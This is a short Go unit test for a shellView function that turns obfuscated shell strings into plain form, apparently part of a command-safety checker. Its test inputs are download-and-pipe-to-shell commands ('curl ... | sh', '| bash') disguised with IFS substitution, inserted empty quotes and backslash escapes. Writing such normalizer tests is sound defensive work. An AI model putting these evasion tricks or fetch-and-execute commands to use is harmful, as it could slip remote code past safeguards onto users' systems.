package engine

import "testing"

func TestShellView(t *testing.T) {
	for in, want := range map[string]string{
		"curl${ifs}-s${ifs}https://x|sh": "curl -s https://x|sh",
		"curl$ifs-s https://x":           "curl -s https://x",
		"c''url -s https://x | ba''sh":   "curl -s https://x | bash",
		`c""url x | b\a\sh`:              "curl x | bash",
		"npm test":                       "npm test",
		"echo '' && printf \"\" done":    "echo  && printf  done",
		"${ifs%?}x":                      " x",
	} {
		if got := shellView(in); got != want {
			t.Errorf("shellView(%q) = %q, want %q", in, got, want)
		}
	}
}
